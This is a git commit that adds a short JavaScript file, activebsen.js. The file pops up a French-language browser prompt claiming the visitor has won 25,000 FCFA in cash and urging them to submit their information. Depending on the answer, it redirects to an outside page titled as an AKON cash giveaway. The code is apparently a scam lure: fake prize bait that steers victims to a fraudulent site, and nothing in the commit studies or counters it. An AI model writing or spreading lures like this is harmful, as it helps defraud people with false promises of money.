c4cfb81677c723c14a947f32adbb8046af6010be
mitahelp <lawsonmitaa@gmail.com>
2026-01-21 00:13:33 +0100

    Create activebsen.js

---
+++ activebsen.js
@@ -0,0 +1,5 @@
+var password = 'Soumettre maintenant'
+password=prompt('Avis: Félicitations, vous êtes éligible pour recevoir les 25 000 FCFA en espèces, veuillez appuyer sur OK pour soumettre vos informations et recevoir vos 25 000 FCFA maintenant','Soumettre maintenant');
+if (password != 'Soumettre maintenant') {
+location.href='https://offresargen.org/AKON-Distribue-25000-FCFA.html';
+}
